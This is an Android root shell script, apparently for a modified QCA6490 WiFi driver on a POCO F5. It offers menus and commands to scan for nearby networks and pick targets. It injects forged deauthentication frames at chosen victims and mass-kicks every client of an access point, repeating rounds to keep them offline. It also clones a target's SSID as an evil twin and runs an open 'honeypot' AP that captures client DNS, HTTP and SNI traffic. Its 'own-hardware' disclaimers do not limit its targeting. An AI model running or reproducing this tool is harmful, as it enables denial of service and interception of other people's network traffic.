#!/system/bin/sh
# ============================================================
#  lab - QCA6490 WiFi research command center (interactive)
#  POCO F5 / marble - kernel 5.10.258-Bouquet-v4.9 (v16+)
#  Run as root:   su -c "/data/local/tmp/lab"          (menus)
#                 su -c "/data/local/tmp/lab <cmd> .." (direct)
#  Own-hardware research only. Gates are default-off on purpose.
# ============================================================

P=/data/local/tmp
Q=/sys/module/qca6490/parameters
SCANF="$P/.lab_scan"
PICKF="$P/.lab_pick"

# ---------- output helpers ----------
if [ -t 1 ]; then
    R=$'\033[31m'; G=$'\033[32m'; Y=$'\033[33m'; C=$'\033[36m'
    B=$'\033[1m';  N=$'\033[0m'
else
    R=""; G=""; Y=""; C=""; B=""; N=""
fi

banner() {
    echo "${C}${B}"
    echo "  +--------------------------------------------+"
    echo "  |   lab  -  QCA6490 research command center  |"
    echo "  +--------------------------------------------+${N}"
}

hdr()  { echo; echo "${C}${B}== $* ==${N}"; }
say()  { echo "  $*"; }
ok()   { echo "  ${G}+ $*${N}"; }
warn() { echo "  ${Y}! $*${N}"; }
err()  { echo "  ${R}x $*${N}"; }
ask()  { printf "  ${B}? %s${N}" "$1"; }

# ---------- state helpers ----------
gate_on()  { printf Y > "$Q/$1" 2>/dev/null; }
gate_off() { printf N > "$Q/$1" 2>/dev/null; }

gates_all_off() {
    gate_off monitor_probe_tx
    gate_off monitor_probe_tx_sta_vdev
    gate_off monitor_mgmt_tx_unrestricted
    gate_off monitor_mgmt_tx_spoof_sa
    gate_off monitor_spoof_tx_sap
    gate_off monitor_spoof_tx_data
    gate_off monitor_data_tx
    echo 0 > "$Q/monitor_mgmt_tx_chanfreq" 2>/dev/null
}

flat()     { echo "$1" | tr -d ':'; }
cur_freq() { cmd wifi status 2>/dev/null | grep -o "Frequency: [0-9]*MHz" | head -1 | tr -dc 0-9; }
cur_bssid(){ cmd wifi status 2>/dev/null | grep -o "BSSID: [0-9a-fA-F:]*" | head -1 | cut -d' ' -f2; }

# send_frame <freq> <hex>  -> writes the direct trigger
send_frame() {
    printf '%s:%s' "$1" "$2" > "$Q/monitor_spoof_tx"
}

# build_deauth <da-flat> <sa-flat> <bssid-flat>  -> sets DEAUTH_HEX
build_deauth() {
    DEAUTH_HEX="c0000000${1}${2}${3}00000700"
}

show_counters() {
    say "firmware/trigger telemetry:"
    cat "$Q/monitor_probe_tx_status" 2>/dev/null | sed 's/^/      /'
    cat "$Q/monitor_spoof_tx" 2>/dev/null | sed 's/^/      /'
}

# mgmt gates for the STA route
gates_sta_mgmt() {
    gate_on  monitor_probe_tx
    gate_on  monitor_mgmt_tx_unrestricted
    gate_on  monitor_mgmt_tx_spoof_sa
    gate_off monitor_probe_tx_sta_vdev
    gate_off monitor_spoof_tx_sap
    gate_off monitor_spoof_tx_data
    gate_off monitor_data_tx
}

# ============================================================
#  scan + pick
# ============================================================
do_scan() {
    hdr "scanning"
    cmd wifi start-scan >/dev/null 2>&1
    sleep 6
    cmd wifi list-scan-results 2>/dev/null > "$SCANF"
    awk 'NF > 4 && $1 ~ /^[0-9a-fA-F][0-9a-fA-F]:/ {
        bssid=$1; freq=$2; rssi=$3;
        sub(/\(.*/, "", rssi);
        ssid="";
        for (i=5; i<=NF; i++) ssid = ssid (i>5 ? " " : "") $i;
        i = index(ssid, " [");
        if (i > 0) ssid = substr(ssid, 1, i - 1);
        if (ssid ~ /^\[/) ssid = "";
        n++;
        printf "%d|%s|%s|%s|%s\n", n, bssid, freq, rssi, (ssid==""?"(hidden)":ssid)
    }' "$SCANF" > "$PICKF"
    say "found $(wc -l < "$PICKF" 2>/dev/null) networks"
}

pick_ap() {
    do_scan
    if [ ! -s "$PICKF" ]; then
        err "scan returned nothing"
        return 1
    fi
    echo
    awk -F'|' '{ printf "  %2d) %-17s  %5s MHz  %5s dBm   %s\n", $1, $2, $3, $4, $5 }' "$PICKF"
    echo
    ask "pick a target [1-n], 0=back: "
    read sel || sel=0
    case "$sel" in
        ''|0) return 1 ;;
    esac
    line=$(awk -F'|' -v n="$sel" '$1==n' "$PICKF")
    if [ -z "$line" ]; then
        err "no such entry"
        return 1
    fi
    T_BSSID=$(echo "$line" | awk -F'|' '{print $2}')
    T_FREQ=$(echo "$line"  | awk -F'|' '{print $3}')
    T_RSSI=$(echo "$line"  | awk -F'|' '{print $4}')
    T_SSID=$(echo "$line"  | awk -F'|' '{print $5}')
    ok "target: ${T_SSID}  ${T_BSSID}  ${T_FREQ} MHz  ${T_RSSI} dBm"
    return 0
}

# ============================================================
#  direct actions (also used by the menus)
# ============================================================
act_sta_deauth() {                       # $1 victim, $2 count, $3 interval
    freq=$(cur_freq); bssid=$(flat "$(cur_bssid)")
    victim=$(flat "$1"); count=${2:-1}; interval=${3:-0.2}
    if [ -z "$freq" ] || [ -z "$bssid" ] || [ -z "$victim" ]; then
        err "need: connection + victim mac"; return 1
    fi
    gates_sta_mgmt
    build_deauth "$victim" "$bssid" "$bssid"
    say "in-band deauth: freq=$freq bssid=$bssid victim=$victim x$count"
    i=0
    while [ "$i" -lt "$count" ]; do
        send_frame "$freq" "$DEAUTH_HEX"
        i=$((i + 1))
        [ "$i" -lt "$count" ] && sleep "$interval"
    done
    sleep 2
    show_counters
    warn "in-band only: the victim must share this channel"
}

act_ap_up() {                            # $1 freq, $2 ssid, $3 pass
    freq=$1; ssid=${2:-LabAP}; pass=${3:-labpass123}
    if [ -z "$freq" ]; then err "need a frequency"; return 1; fi
    band=2; [ "$freq" -ge 4000 ] 2>/dev/null && band=5
    hdr "AP role: $ssid on $freq MHz (band $band)"
    cmd wifi stop-softap >/dev/null 2>&1
    svc wifi disable
    sleep 1
    cmd wifi start-softap "$ssid" wpa2 "$pass" >/dev/null 2>&1
    n=0
    while :; do
        got=$(cmd wifi status 2>/dev/null | grep -o "frequency= *[0-9]*" | head -1 | tr -dc 0-9)
        [ -n "$got" ] && break
        n=$((n + 1))
        [ "$n" -ge 10 ] && break
        sleep 2
    done
    say "AP started on ${got:-?} MHz, forcing $freq ..."
    echo "$freq" > "$Q/monitor_sap_force_channel"
    n=0
    while :; do
        got=$(cmd wifi status 2>/dev/null | grep -o "frequency= *[0-9]*" | head -1 | tr -dc 0-9)
        [ "$got" = "$freq" ] && break
        n=$((n + 1))
        [ "$n" -ge 8 ] && break
        sleep 2
    done
    if [ "$got" = "$freq" ]; then
        ok "SAP confirmed on $freq MHz"
    else
        warn "channel not confirmed (reports ${got:-?}) - verify with lab status"
    fi
    gate_on  monitor_probe_tx
    gate_on  monitor_mgmt_tx_unrestricted
    gate_on  monitor_mgmt_tx_spoof_sa
    gate_on  monitor_spoof_tx_sap
    gate_off monitor_probe_tx_sta_vdev
    gate_off monitor_spoof_tx_data
    gate_off monitor_data_tx
    ok "AP-role gates on - phone is unassociated (STA off)"
}

act_ap_deauth() {                        # $1 victim, $2 ap-bssid, $3 count, $4 interval
    victim=$(flat "$1"); vapid=$(flat "$2")
    count=${3:-1}; interval=${4:-0.2}
    freq=$(cat "$Q/monitor_sap_force_channel" 2>/dev/null)
    if [ -z "$victim" ] || [ -z "$vapid" ]; then
        err "need victim mac + victim AP bssid"; return 1
    fi
    if [ -z "$freq" ] || [ "$freq" = "0" ]; then
        err "SAP not up - run ap-up / impersonate first"; return 1
    fi
    gate_on  monitor_probe_tx
    gate_on  monitor_mgmt_tx_unrestricted
    gate_on  monitor_mgmt_tx_spoof_sa
    gate_on  monitor_spoof_tx_sap
    gate_off monitor_probe_tx_sta_vdev
    gate_off monitor_spoof_tx_data
    gate_off monitor_data_tx
    build_deauth "$victim" "$vapid" "$vapid"
    say "forged deauth: freq=$freq victim=$victim as=$vapid x$count"
    i=0
    while [ "$i" -lt "$count" ]; do
        send_frame "$freq" "$DEAUTH_HEX"
        i=$((i + 1))
        [ "$i" -lt "$count" ] && sleep "$interval"
    done
    sleep 2
    show_counters
}

# burst one client: sleeping radios miss single frames, so fire a spread
act_burst() {                            # $1 freq, $2 hex, $3 frames, $4 interval
    j=0
    while [ "$j" -lt "${3:-5}" ]; do
        send_frame "$1" "$2"
        j=$((j + 1))
        [ "$j" -lt "${3:-5}" ] && sleep "${4:-0.4}"
    done
}

act_data() {                             # $1 freq, $2 hex
    gate_on  monitor_probe_tx
    gate_on  monitor_mgmt_tx_unrestricted
    gate_on  monitor_data_tx
    gate_on  monitor_spoof_tx_data
    gate_off monitor_probe_tx_sta_vdev
    gate_off monitor_spoof_tx_sap
    gate_off monitor_mgmt_tx_spoof_sa
    send_frame "$1" "$2"
    sleep 2
    say "trigger: $(cat "$Q/monitor_spoof_tx" 2>/dev/null)"
    dmesg 2>/dev/null | grep mon_data_tx | tail -3
}

act_mgmt() {                             # $1 freq, $2 hex
    gates_sta_mgmt
    send_frame "$1" "$2"
    sleep 2
    show_counters
}

act_monitor() {                          # $1 freq, $2 seconds, $3 out-name|-|""=ask-no
    freq=${1:-2412}; secs=${2:-20}; name=${3:--}
    out=""
    if [ -n "$name" ] && [ "$name" != "-" ]; then
        out="$P/${name%.pcap}.pcap"
    fi
    hdr "true monitor conparam: $freq MHz for ${secs}s"
    cmd wifi stop-softap >/dev/null 2>&1
    svc wifi disable
    sleep 1
    echo 4 > /sys/module/qca6490/parameters/con_mode
    "$P/nl80211_probe" del mon0 >/dev/null 2>&1
    "$P/nl80211_probe" addmon mon0 >/dev/null 2>&1 || true
    sleep 6
    ip link set wlan0 up 2>/dev/null
    printf '%s 0\n' "$freq" > /sys/class/net/wlan0/monitor_mode_channel 2>/dev/null
    stage=$(cat "$Q/mon_chan_set_stage" 2>/dev/null)
    [ "$stage" = "20" ] && ok "channel set (stage 20)" || warn "channel stage=$stage (20 = ok)"
    say "capturing ${secs}s on $freq ..."
    if [ -n "$out" ]; then
        "$P/mon_capture" wlan0 "$secs" "$out" 2>/dev/null || \
            "$P/mon_capture" mon0 "$secs" "$out"
        sz=$(ls -la "$out" 2>/dev/null | awk '{print $5}')
        ok "saved: $out (${sz:-?} bytes)"
        say "pull with:  adb pull $out"
        say "open in Wireshark directly (radiotap + 802.11)"
    else
        "$P/mon_capture" wlan0 "$secs" 2>/dev/null || "$P/mon_capture" mon0 "$secs"
    fi
    say "restore with: lab wifi-restore"
}

# act_honeypot <ssid> <pass|-> <duration-sec> <out-name|->
# repeater honeypot: STA stays connected (uplink), AP on top,
# all client traffic captured on the AP interface as pcap.
act_honeypot() {
    ssid=${1:-LabAP}
    pass=${2:--}
    dur=${3:-60}
    name=${4:-}
    if [ "$pass" = "-" ] || [ -z "$pass" ]; then pass=""; fi
    [ "$name" = "-" ] && name=""
    out="$P/${name:-honey_$(date +%Y%m%d_%H%M%S)}.pcap"
    freq=$(cur_freq); bssid=$(cur_bssid)
    hdr "honeypot: '$ssid'"
    if [ -z "$freq" ]; then
        warn "no uplink (STA not connected) - clients get no internet, capture still works"
    else
        ok "uplink: $bssid @ ${freq} MHz - client traffic routes through this phone"
    fi
    cmd wifi stop-softap >/dev/null 2>&1
    sleep 1
    if [ -z "$pass" ]; then
        say "starting OPEN AP (no password)..."
        cmd wifi start-softap "$ssid" open >/dev/null 2>&1
    else
        say "starting WPA2 AP (pass: $pass)..."
        cmd wifi start-softap "$ssid" wpa2 "$pass" >/dev/null 2>&1
    fi
    sleep 9
    iface=$(cmd wifi status 2>/dev/null | grep -oE "wlan[0-9]+=SoftApInfo" | head -1 | cut -d= -f1)
    [ -z "$iface" ] && iface=wlan2
    got=$(cmd wifi status 2>/dev/null | grep -o "frequency= *[0-9]*" | head -1 | tr -dc 0-9)
    if [ -z "$got" ]; then
        sleep 4
        got=$(cmd wifi status 2>/dev/null | grep -o "frequency= *[0-9]*" | head -1 | tr -dc 0-9)
    fi
    say "AP interface : $iface"
    say "AP channel   : ${got:-?} MHz"
    if [ -z "$pass" ]; then
        warn "OPEN network - anyone can join; their traffic is unencrypted to the phone"
    fi
    warn "capture sees: DNS + HTTP fully, HTTPS destinations (SNI); TLS content stays sealed"
    hdr "capturing $iface for ${dur}s -> $out"
    "$P/eth_dump" "$iface" "$dur" "$out"
    sz=$(ls -la "$out" 2>/dev/null | awk '{print $5}')
    ok "saved: $out (${sz:-?} bytes)"
    say "pull with:  adb pull $out"
    say "open in Wireshark directly (Ethernet linktype)"
    warn "Android auto-stops the AP after ~10 min with no clients joined"
}

cmd_status() {
    hdr "status"
    say "kernel    : $(uname -r)"
    say "con_mode  : $(cat /sys/module/qca6490/parameters/con_mode 2>/dev/null)"
    say "gates:"
    for g in monitor_probe_tx monitor_probe_tx_sta_vdev \
             monitor_mgmt_tx_unrestricted monitor_mgmt_tx_spoof_sa \
             monitor_spoof_tx_sap monitor_spoof_tx_data monitor_data_tx; do
        printf '      %-34s %s\n' "$g" "$(cat "$Q/$g" 2>/dev/null)"
    done
    say "chanfreq  : $(cat "$Q/monitor_mgmt_tx_chanfreq" 2>/dev/null)"
    say "sap_force : $(cat "$Q/monitor_sap_force_channel" 2>/dev/null)"
    show_counters
    say "wifi      : $(cmd wifi status 2>/dev/null | head -3 | tr '\n' ' ' | cut -c1-100)"
    ip -br link 2>/dev/null | grep wlan | sed 's/^/      /'
    say "tools:"
    for t in nl80211_probe nl80211_mgmt_tx nl80211_probe_tx mon_inject_raw \
             mon_capture hapd_ctrl qca_sap_acs; do
        if [ -x "$P/$t" ]; then say "  $t ok"; else err "  $t MISSING"; fi
    done
}

# act_deauth_all <ap-bssid> <freq> [listen-secs] [rounds] [interval]
# phase 1: monitor census on the channel, correlating clients of the AP
# phase 2: AP-role on the same channel (unassociated)
# phase 3: forged deauth to every client found, N rounds
act_deauth_all() {
    apb=$(flat "${1:?usage: lab deauth-all <ap-bssid> <freq> [listen-secs] [rounds] [interval]}")
    freq=${2:?usage: lab deauth-all <ap-bssid> <freq> [listen-secs] [rounds] [interval]}
    listen=${3:-15}
    rounds=${4:-1}
    interval=${5:-0.3}
    clf="$P/.lab_clients_$apb"

    hdr "phase 1: listening ${listen}s on $freq for clients of $1"
    cmd wifi stop-softap >/dev/null 2>&1
    svc wifi disable
    sleep 1
    echo 4 > /sys/module/qca6490/parameters/con_mode
    "$P/nl80211_probe" del mon0 >/dev/null 2>&1
    "$P/nl80211_probe" addmon mon0 >/dev/null 2>&1 || true
    sleep 6
    ip link set wlan0 up 2>/dev/null
    printf '%s 0\n' "$freq" > /sys/class/net/wlan0/monitor_mode_channel 2>/dev/null
    "$P/mon_capture" wlan0 "$listen" - "$apb" "$clf"

    echo 0 > /sys/module/qca6490/parameters/con_mode
    gates_all_off
    svc wifi enable
    sleep 6

    if [ ! -s "$clf" ]; then
        err "no clients of this AP seen on the channel - nothing to kick"
        return 1
    fi
    ok "clients found: $(wc -l < "$clf")"
    sed 's/^/      /' "$clf"

    hdr "phase 2: AP role on $freq (impersonating $1)"
    act_ap_up "$freq" LabAP labpass123

    hdr "phase 3: mass deauth x$rounds rounds (burst per client)"
    i=0
    while [ "$i" -lt "$rounds" ]; do
        for c in $(cat "$clf"); do
            act_burst "$freq" "c0000000${c}${apb}${apb}00000700" 5 0.4
        done
        i=$((i + 1))
        say "round $i/$rounds done"
        [ "$i" -lt "$rounds" ] && sleep 1
    done
    sleep 2
    show_counters
    say "clients will reconnect on their own; repeat rounds to keep them down"
}

# ============================================================
#  guided flows
# ============================================================
flow_attack_menu() {
    while :; do
        hdr "target: ${T_SSID}  (${T_BSSID} @ ${T_FREQ} MHz, ${T_RSSI} dBm)"
        echo "   1) deauth a client of this AP"
        echo "   2) impersonate this AP (channel-force + forged frames)"
        echo "   3) evil twin - clone this SSID on this channel"
        echo "   4) monitor - capture on this channel"
        echo "   5) raw data frame (needs connected STA)"
        echo "   6) deauth ALL clients of this AP (census + mass kick)"
        echo "   0) back"
        ask "action: "
        read act || act=0
        case "$act" in
        1)
            ask "victim mac (e.g. aa:bb:cc:dd:ee:ff): "
            read vm || vm=""
            [ -z "$vm" ] && { err "need a victim"; continue; }
            mybssid=$(flat "$(cur_bssid)")
            if [ "$mybssid" = "$(flat "$T_BSSID")" ]; then
                ok "phone is on this AP - in-band STA route"
                ask "count [1]: "; read c; ask "interval sec [0.2]: "; read iv
                act_sta_deauth "$vm" "${c:-1}" "${iv:-0.2}"
            else
                warn "phone is not on this AP - using AP-role escape"
                act_ap_up "$T_FREQ"
                ask "count [1]: "; read c; ask "interval sec [0.2]: "; read iv
                act_ap_deauth "$vm" "$T_BSSID" "${c:-1}" "${iv:-0.2}"
            fi
            ;;
        2)
            act_ap_up "$T_FREQ"
            while :; do
                ask "victim mac (0=back): "
                read vm || vm=0
                [ "$vm" = "0" ] && break
                [ -z "$vm" ] && continue
                ask "count [1]: "; read c; ask "interval sec [0.2]: "; read iv
                act_ap_deauth "$vm" "$T_BSSID" "${c:-1}" "${iv:-0.2}"
            done
            ;;
        3)
            [ "$T_SSID" = "(hidden)" ] && { err "cannot clone a hidden SSID"; continue; }
            ask "passphrase for the twin [labpass123]: "
            read pw || pw=""
            act_ap_up "$T_FREQ" "$T_SSID" "${pw:-labpass123}"
            warn "twin is up - no internet behind it; clients that join are yours"
            ;;
        4)
            ask "seconds [20]: "
            read s || s=""
            ask "save pcap as (empty = count only): "
            read o || o=""
            act_monitor "$T_FREQ" "${s:-20}" "${o:--}"
            ;;
        5)
            ask "hex data frame (fc 0x8800 + da + sa + bssid + seq + qos): "
            read hx || hx=""
            [ -z "$hx" ] && continue
            act_data "$T_FREQ" "$hx"
            ;;
        6)
            warn "this kicks every client seen on ${T_BSSID} - own network only"
            ask "listen seconds [15]: "; read ls_ || ls_=""
            ask "rounds [1]: "; read r || r=""
            ask "interval sec [0.3]: "; read iv || iv=""
            act_deauth_all "$T_BSSID" "$T_FREQ" "${ls_:-15}" "${r:-1}" "${iv:-0.3}"
            ;;
        0|q) break ;;
        esac
    done
}

flow_main_menu() {
    while :; do
        hdr "main menu"
        echo "   1) scan + pick a target (guided)"
        echo "   2) status"
        echo "   3) honeypot - open AP repeater + full capture"
        echo "   4) monitor capture (any channel)"
        echo "   5) raw mgmt frame (direct)"
        echo "   6) raw data frame (direct)"
        echo "   7) restore normal wifi (gates off)"
        echo "   q) quit"
        ask "choose: "
        read m || m=q
        case "$m" in
        1) if pick_ap; then flow_attack_menu; fi ;;
        2) cmd_status ;;
        3)
            ask "AP SSID [LabAP]: "; read s || s=""
            ask "passphrase ('-' = open network): "; read pw || pw=""
            ask "capture duration seconds [60]: "; read d || d=""
            ask "output name (optional): "; read o || o=""
            act_honeypot "${s:-LabAP}" "${pw:--}" "${d:-60}" "${o:--}"
            ;;
        4) ask "freq [2412]: "; read f; ask "seconds [20]: "; read s
           ask "save pcap as (empty = count only): "; read o
           act_monitor "${f:-2412}" "${s:-20}" "${o:--}" ;;
        5) ask "freq: "; read f; ask "hex frame: "; read hx
           [ -n "$f" ] && [ -n "$hx" ] && act_mgmt "$f" "$hx" ;;
        6) ask "freq: "; read f; ask "hex data frame: "; read hx
           [ -n "$f" ] && [ -n "$hx" ] && act_data "$f" "$hx" ;;
        7) gates_all_off; cmd wifi stop-softap >/dev/null 2>&1
           echo 0 > /sys/module/qca6490/parameters/con_mode
           svc wifi enable; sleep 4
           ok "restored (reboot if wifi did not come back)" ;;
        q|Q|"") break ;;
        esac
    done
    gates_all_off
    ok "gates off - bye"
}

# ============================================================
#  direct (scriptable) commands
# ============================================================
cmd_help() {
    banner
    echo
    echo "  interactive:  su -c /data/local/tmp/lab"
    echo
    echo "  direct commands:"
    echo "    status                          gates, counters, state"
    echo "    scan                            list networks"
    echo "    sta-deauth <victim> [n] [sec]   in-band deauth (connected STA)"
    echo "    ap-up <freq> [ssid] [pass]      unassociated AP + channel force"
    echo "    ap-deauth <victim> <apbssid>    forged deauth via SAP"
    echo "                 [n] [sec]"
    echo "    ap-down                         stop AP + gates off"
    echo "    eviltwin <ssid> <pass> <freq>   clone an SSID on a channel"
    echo "    mgmt <freq> <hex>               raw management frame"
    echo "    data <freq> <hex>               raw data frame (v20 DP path)"
    echo "    deauth-all <apbssid> <freq>     census clients of an AP, then"
    echo "                 [sec] [rds] [iv]   mass-kick them (AP-role)"
    echo "    monitor <freq> [seconds] [name] true monitor + capture"
    echo "                                    (name given = save Wireshark pcap)"
    echo "    honeypot <ssid> <pass|-> <sec>  repeater: STA up + AP + pcap"
    echo "               [name]               capture of all client traffic"
    echo "    wifi-restore                    gates off, normal wifi"
    echo "    gates-off                       all gates N"
}

case "${1:-menu}" in
    menu)         banner; flow_main_menu ;;
    status)       cmd_status ;;
    scan)         do_scan; awk -F'|' '{ printf "  %2d) %-17s  %5s MHz  %5s dBm   %s\n", $1, $2, $3, $4, $5 }' "$PICKF" ;;
    sta-deauth)   shift; act_sta_deauth "$@" ;;
    ap-up)        shift; act_ap_up "$@" ;;
    ap-down)      cmd wifi stop-softap >/dev/null 2>&1; gates_all_off; ok "AP down, gates off" ;;
    ap-deauth)    shift; act_ap_deauth "$@" ;;
    eviltwin)     freq=$4; ssid=$2; pass=$3; [ -z "$freq" ] && { err "usage: lab eviltwin <ssid> <pass> <freq>"; exit 1; }; act_ap_up "$freq" "$ssid" "$pass" ;;
    mgmt)         shift; act_mgmt "$@" ;;
    data)         shift; act_data "$@" ;;
    deauth-all)   shift; act_deauth_all "$@" ;;
    monitor)      shift; act_monitor "$@" ;;
    honeypot)     shift; act_honeypot "$@" ;;
    wifi-restore) gates_all_off; cmd wifi stop-softap >/dev/null 2>&1
                  echo 0 > /sys/module/qca6490/parameters/con_mode
                  svc wifi enable; sleep 5; cmd wifi status | head -3
                  warn "reboot if wifi did not come back" ;;
    gates-off)    gates_all_off; ok "all gates N" ;;
    help|--help|-h) cmd_help ;;
    *)            err "unknown: $1"; cmd_help; exit 1 ;;
esac
